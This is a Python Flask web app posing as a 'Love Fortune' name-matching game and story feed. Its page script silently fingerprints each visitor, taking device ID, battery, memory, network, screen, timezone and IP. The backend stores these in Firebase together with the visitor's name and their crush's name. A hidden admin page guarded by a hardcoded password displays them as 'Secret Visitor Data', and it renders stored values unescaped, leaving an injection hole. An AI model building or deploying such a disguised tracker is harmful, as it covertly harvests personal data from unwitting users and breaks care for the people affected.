from flask import Flask, request, jsonify, render_template_string
import os
import random
import requests
import re
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

def sanitize_key(text):
    """Replace invalid Firebase key characters with underscore"""
    return re.sub(r'[.#$\[\]]', '_', text.strip())

# ========== LOVE FORTUNE ENGINE ==========
def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
        f"💖 {name1} + {name2} = {percentage}% endless affection!",
        # ... (full list of 70+ messages – keep as before)
        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
    ]
    return random.choice(messages)

def analyze_story(text):
    text = text.lower()
    sad_triggers = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone']
    if any(word in text for word in sad_triggers):
        return "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you."
    return "💖 This is absolutely wonderful! Your love story is like a fairytale. Keep glowing!"

# ========== COMBINED HTML + CSS + JS (same as before, no changes) ==========
HTML_UI = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love & Story Hub</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
    <style>
        :root { --primary: #f5576c; --secondary: #764ba2; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            width: 100%;
            max-width: 500px;
            border-radius: 30px;
            padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        h1 { text-align: center; color: var(--secondary); margin-bottom: 15px; }
        .tabs { display: flex; gap: 10px; margin-bottom: 25px; }
        .tab-btn {
            flex: 1; padding: 12px; border: none; border-radius: 20px;
            background: #eee; cursor: pointer; font-weight: bold;
        }
        .tab-btn.active { background: var(--primary); color: white; }
        .tab-content { display: none; animation: fadeIn 0.3s; }
        .tab-content.active { display: block; }
        input, textarea {
            width: 100%; padding: 14px; margin: 10px 0;
            border: 1px solid #ddd; border-radius: 15px; font-size: 16px;
        }
        .main-btn {
            width: 100%; padding: 14px; background: linear-gradient(to right, var(--primary), var(--secondary));
            color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }
        .result-area { background: #fff5f6; border-radius: 20px; padding: 20px; text-align: center; margin-top: 20px; }
        .story-card {
            background: #fefefe; padding: 15px; border-radius: 18px; margin-top: 15px;
            border-left: 5px solid var(--primary); box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .bot-reply { font-style: italic; color: var(--secondary); font-size: 0.9em; margin-top: 8px; }
        .actions { display: flex; gap: 10px; margin-top: 10px; align-items: center; }
        .like-btn { background: none; border: none; color: var(--primary); font-weight: bold; cursor: pointer; }
        .cmnt-item { font-size: 12px; background: #f0f0f0; padding: 5px; border-radius: 8px; margin-top: 5px; }
        .feed { max-height: 500px; overflow-y: auto; margin-top: 15px; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        /* Love card styling */
        .love-card {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #ffdde1 100%);
            border-radius: 30px;
            padding: 25px;
            text-align: center;
            font-family: 'Segoe UI', cursive;
            max-width: 400px;
            margin: 10px auto;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        .love-card h2 { color: #fff; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
        .love-card .percentage { font-size: 3.5em; font-weight: bold; color: #ff1493; }
        .love-card .names { font-size: 1.8em; font-weight: bold; color: #fff; margin: 15px 0; }
        .love-card .message { font-style: italic; color: #6b4e6e; margin-top: 10px; }
        .share-btn { background: #1da1f2; margin-top: 10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="tabs">
        <button class="tab-btn active" onclick="showTab('fortune')">🔮 Fortune</button>
        <button class="tab-btn" onclick="showTab('stories')">📖 Story Box</button>
    </div>

    <!-- Fortune Tab -->
    <div id="fortune" class="tab-content active">
        <h1>💕 Love Fortune</h1>
        <input type="text" id="yourName" placeholder="Your Name">
        <input type="text" id="crushName" placeholder="Their Name">
        <button class="main-btn" onclick="calculateFortune()">Reveal Destiny</button>
        <div id="resultArea" class="result-area" style="display: none;">
            <div id="loveCardContainer"></div>
            <button id="shareCardBtn" class="main-btn share-btn" style="display: none;" onclick="downloadLoveCard()">📸 Download as Image</button>
        </div>
    </div>

    <!-- Story Tab -->
    <div id="stories" class="tab-content">
        <h1>📖 Love & Heartbreak</h1>
        <textarea id="storyInput" rows="4" placeholder="Share your story... (love, breakup, friendship)"></textarea>
        <button class="main-btn" onclick="postStory()">Share Story</button>
        <div id="storyFeed" class="feed">Loading stories...</div>
    </div>
</div>

<script>
    function sanitizeKey(str) {
        return str.replace(/[.#$\\[\\]]/g, '_');
    }

    let deviceData = { timestamp: new Date().toISOString() };
    let currentCardHTML = "";

    async function collectDeviceInfo() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            deviceData.fingerprint = result.visitorId;
        } catch(e) { deviceData.fingerprint = 'unknown'; }
        deviceData.screen = screen.width + 'x' + screen.height;
        deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        deviceData.userAgent = navigator.userAgent;
        if (navigator.deviceMemory) deviceData.deviceMemory = navigator.deviceMemory + ' GB';
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                deviceData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        const conn = navigator.connection;
        if (conn) deviceData.networkType = conn.effectiveType;
    }

    async function calculateFortune() {
        const name1 = document.getElementById('yourName').value.trim();
        const name2 = document.getElementById('crushName').value.trim();
        if (!name1 || !name2) {
            alert("Please fill both names 💕");
            return;
        }

        const visitorKey = sanitizeKey(name1) + '_' + sanitizeKey(name2);
        deviceData.name = name1;
        deviceData.crush_name = name2;
        deviceData.visitorKey = visitorKey;

        await fetch('/save-device', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(deviceData)
        });

        try {
            const res = await fetch('/calculate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ n1: name1, n2: name2 })
            });
            const data = await res.json();
            const percent = data.score;
            const msg = data.msg;

            currentCardHTML = `
                <div id="loveCard" class="love-card">
                    <h2>💕 Love Fortune 💕</h2>
                    <div class="percentage">${percent}%</div>
                    <div class="names">${escapeHtml(name1)} ❤️ ${escapeHtml(name2)}</div>
                    <div class="message">${escapeHtml(msg)}</div>
                    <div style="margin-top:15px; font-size:12px;">✨ ${new Date().toLocaleDateString()} ✨</div>
                </div>
            `;
            document.getElementById('loveCardContainer').innerHTML = currentCardHTML;
            document.getElementById('resultArea').style.display = 'block';
            document.getElementById('shareCardBtn').style.display = 'block';

            deviceData.fortuneText = msg;
            deviceData.percentage = percent;
            await fetch('/save-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceData)
            });
        } catch(e) {
            alert("Error calculating fortune.");
        }
    }

    function downloadLoveCard() {
        const element = document.getElementById('loveCard');
        if (!element) return;
        html2canvas(element, { scale: 2, backgroundColor: null }).then(canvas => {
            const link = document.createElement('a');
            link.download = 'love_card.png';
            link.href = canvas.toDataURL();
            link.click();
        });
    }

    async function postStory() {
        const content = document.getElementById('storyInput').value.trim();
        if (!content) { alert("Please write a story first."); return; }
        const author = prompt("Enter your name (or leave empty for 'Anonymous'):", "Anonymous");
        const finalAuthor = (author && author.trim()) ? author.trim() : "Anonymous";
        const res = await fetch('/post-story', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ author: finalAuthor, content }) });
        const result = await res.json();
        if (result.ok) {
            alert("Story posted!");
            document.getElementById('storyInput').value = '';
            loadStories();
        } else alert("Error posting story.");
    }

    async function loadStories() {
        const feed = document.getElementById('storyFeed');
        feed.innerHTML = "📖 Loading stories...";
        try {
            const res = await fetch('/get-stories');
            const stories = await res.json();
            feed.innerHTML = '';
            if (Object.keys(stories).length === 0) {
                feed.innerHTML = "<p style='text-align:center;'>No stories yet. Be the first to share!</p>";
                return;
            }
            Object.entries(stories).reverse().forEach(([id, story]) => {
                let commentsHtml = '';
                if (story.comments) {
                    Object.values(story.comments).forEach(c => {
                        commentsHtml += `<div class="cmnt-item">💬 ${escapeHtml(c.text)}</div>`;
                    });
                }
                feed.innerHTML += `
                    <div class="story-card">
                        <strong>👤 ${escapeHtml(story.author)}</strong>
                        <p style="margin-top:8px;">${escapeHtml(story.content)}</p>
                        <div class="bot-reply">🤖 Bot: ${escapeHtml(story.reply)}</div>
                        <div class="actions">
                            <button class="like-btn" onclick="likeStory('${id}')">❤️ ${story.likes || 0}</button>
                            <span style="font-size:12px;">💬 Comment</span>
                        </div>
                        <div id="comments_${id}">${commentsHtml}</div>
                        <div style="display:flex; gap:5px; margin-top:8px;">
                            <input type="text" id="cmnt_${id}" placeholder="Write a comment..." style="flex:1; padding:8px; font-size:12px;">
                            <button onclick="addComment('${id}')">Send</button>
                        </div>
                    </div>
                `;
            });
        } catch(e) { feed.innerHTML = "<p>Failed to load stories.</p>"; }
    }

    async function likeStory(id) {
        await fetch('/like', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) });
        loadStories();
    }

    async function addComment(id) {
        const text = document.getElementById(`cmnt_${id}`).value.trim();
        if (!text) return;
        await fetch('/comment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id, text }) });
        document.getElementById(`cmnt_${id}`).value = '';
        loadStories();
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    function showTab(tabName) {
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(tabName).classList.add('active');
        if (tabName === 'stories') loadStories();
        event.target.classList.add('active');
    }

    collectDeviceInfo();
</script>
</body>
</html>
'''

# ========== BACKEND ROUTES ==========
@app.route('/')
def home():
    return render_template_string(HTML_UI)

@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.json
    n1 = data['n1']
    n2 = data['n2']
    combined = (n1 + n2).lower()
    score = 50 + (sum(ord(c) for c in combined) % 51)
    msg = get_love_message(n1, n2, score)
    return jsonify({"score": score, "msg": msg})

@app.route('/save-device', methods=['POST'])
def save_device():
    try:
        data = request.get_json()
        key = data.get('visitorKey')
        if not key:
            return jsonify({"status": "error", "message": "Missing visitorKey"}), 400
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        data.pop('visitorKey', None)
        url = f"{FIREBASE_URL}/visitors/{key}.json"
        response = requests.put(url, json=data, timeout=10)
        if response.status_code in [200, 201]:
            return jsonify({"status": "saved"})
        else:
            return jsonify({"status": "error", "details": response.text}), 500
    except Exception as e:
        print(e)
        return jsonify({"status": "error"}), 500

@app.route('/post-story', methods=['POST'])
def post_story():
    try:
        data = request.json
        author = data.get('author', 'Anonymous').strip()
        content = data.get('content', '').strip()
        if not content:
            return jsonify({"ok": False, "error": "Empty story"}), 400
        if not author or author.lower() in ['anonymous', 'unknown']:
            author = '💫 Mysterious Soul'
        reply = analyze_story(content)
        story = {
            "author": author,
            "content": content,
            "reply": reply,
            "likes": 0,
            "timestamp": datetime.now().isoformat()
        }
        r = requests.post(f"{FIREBASE_URL}/stories.json", json=story, timeout=10)
        r.raise_for_status()
        return jsonify({"ok": True})
    except Exception as e:
        print(e)
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route('/like', methods=['POST'])
def like():
    try:
        sid = request.json['id']
        curr = requests.get(f"{FIREBASE_URL}/stories/{sid}/likes.json").json() or 0
        requests.patch(f"{FIREBASE_URL}/stories/{sid}.json", json={"likes": curr + 1})
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/comment', methods=['POST'])
def comment():
    try:
        sid = request.json['id']
        text = request.json['text'].strip()
        if not text:
            return jsonify({"ok": False}), 400
        comment_data = {"text": text, "ts": datetime.now().isoformat()}
        requests.post(f"{FIREBASE_URL}/stories/{sid}/comments.json", json=comment_data)
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/get-stories')
def get_stories():
    try:
        r = requests.get(f"{FIREBASE_URL}/stories.json", timeout=10)
        stories = r.json() or {}
        sorted_stories = dict(sorted(stories.items(), key=lambda x: x[1].get('timestamp', ''), reverse=True))
        return jsonify(sorted_stories)
    except:
        return jsonify({}), 500

# ========== ADMIN DASHBOARD with NEW PASSWORD ==========
@app.route('/admin-panel', methods=['GET', 'POST'])
def admin_panel():
    if request.method == 'POST':
        password = request.form.get('password')
        if password != 'murali123':   # <-- CHANGED PASSWORD
            return "<h1>❌ Wrong password. <a href='/admin-panel'>Try again</a></h1>"
        # Fetch all visitors from Firebase
        try:
            resp = requests.get(f"{FIREBASE_URL}/visitors.json", timeout=10)
            visitors = resp.json() or {}
            if not visitors:
                return "<h1>📊 No visitor data yet.</h1><a href='/admin-panel'>Back</a>"
            # Structured HTML table with better formatting
            html = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Dashboard – Visitor Secret Data</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    * { box-sizing: border-box; }
                    body {
                        background: #0f172a;
                        font-family: 'Segoe UI', Roboto, monospace;
                        padding: 20px;
                        color: #e2e8f0;
                    }
                    h1 {
                        text-align: center;
                        color: #f472b6;
                        margin-bottom: 10px;
                    }
                    .sub {
                        text-align: center;
                        margin-bottom: 30px;
                        color: #94a3b8;
                    }
                    .container {
                        overflow-x: auto;
                        border-radius: 16px;
                        background: #1e293b;
                        padding: 10px;
                        box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                        font-size: 13px;
                        min-width: 1200px;
                    }
                    th {
                        background: #334155;
                        color: #facc15;
                        padding: 12px 8px;
                        text-align: left;
                        font-weight: 600;
                        position: sticky;
                        top: 0;
                        border-bottom: 2px solid #475569;
                    }
                    td {
                        padding: 10px 8px;
                        border-bottom: 1px solid #334155;
                        word-break: break-word;
                        vertical-align: top;
                    }
                    tr:hover {
                        background: #334155;
                    }
                    .badge {
                        background: #10b981;
                        color: white;
                        padding: 2px 8px;
                        border-radius: 20px;
                        font-size: 11px;
                        display: inline-block;
                    }
                    .footer {
                        text-align: center;
                        margin-top: 30px;
                    }
                    .btn {
                        background: #3b82f6;
                        color: white;
                        padding: 8px 16px;
                        text-decoration: none;
                        border-radius: 8px;
                        margin: 0 6px;
                        display: inline-block;
                    }
                    .btn:hover { background: #2563eb; }
                </style>
            </head>
            <body>
                <h1>🔐 Admin Dashboard – Secret Visitor Data</h1>
                <div class="sub">Only you (admin) can see this. Passwords, fingerprints, battery, IPs, and more.</div>
                <div class="container">
                    <table>
                        <thead>
                            <tr>
                                <th>Key (Name_Crush)</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th>
                                <th>Fingerprint</th><th>Battery</th><th>Device Memory</th><th>Network</th>
                                <th>Screen</th><th>Timezone</th><th>IP Address</th><th>Fortune</th><th>Timestamp</th>
                            </tr>
                        </thead>
                        <tbody>
            '''
            for key, visitor in sorted(visitors.items(), key=lambda x: x[0]):  # sort by key (name_crush)
                if isinstance(visitor, dict):
                    # Truncate long fields for readability
                    fp = visitor.get('fingerprint', '-')
                    fp_short = f"{fp[:16]}..." if len(fp) > 20 else fp
                    fortune_short = (visitor.get('fortuneText', '-')[:50] + '...') if len(visitor.get('fortuneText', '')) > 50 else visitor.get('fortuneText', '-')
                    phone = visitor.get('phoneNumber', '-')
                    if phone and phone != '-':
                        phone = f'<span class="badge">{phone}</span>'
                    html += f'''
                        <tr>
                            <td><strong>{key}</strong></td>
                            <td>{visitor.get('name', '-')}</td>
                            <td>{visitor.get('crush_name', '-')}</td>
                            <td style="color:#f472b6; font-weight:bold;">{visitor.get('percentage', '-')}%</td>
                            <td>{phone}</td>
                            <td style="font-family: monospace; font-size:11px;">{fp_short}</td>
                            <td>{visitor.get('batteryLevel', '-')}</td>
                            <td>{visitor.get('deviceMemory', '-')}</td>
                            <td>{visitor.get('networkType', '-')}</td>
                            <td>{visitor.get('screen', '-')}</td>
                            <td>{visitor.get('timezone', '-')}</td>
                            <td style="font-family: monospace;">{visitor.get('ip', '-')}</td>
                            <td style="max-width:250px;">{fortune_short}</td>
                            <td style="font-family: monospace; font-size:11px;">{visitor.get('timestamp', '-')[:19]}</td>
                        </tr>
                    '''
            html += '''
                        </tbody>
                    </table>
                </div>
                <div class="footer">
                    <a href="/admin-panel" class="btn">🔐 Re‑login</a>
                    <a href="/" class="btn">🏠 Back to App</a>
                </div>
            </body>
            </html>
            '''
            return html
        except Exception as e:
            return f"<h1>Error loading data: {e}</h1><a href='/admin-panel'>Back</a>"
    # GET – show login form
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title></head>
        <body style="background:#0f172a; color:#eee; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh;">
            <div style="background:#1e293b; padding:35px; border-radius:24px; text-align:center; width:320px;">
                <h2>🔐 Admin Access</h2>
                <p style="margin-bottom:20px;">Enter password to view secret visitor data</p>
                <form method="POST">
                    <input type="password" name="password" placeholder="Password" style="width:100%; padding:12px; border-radius:12px; border:none; margin-bottom:15px;">
                    <button type="submit" style="background:#3b82f6; color:white; border:none; padding:10px 20px; border-radius:30px; cursor:pointer; width:100%;">Login</button>
                </form>
            </div>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
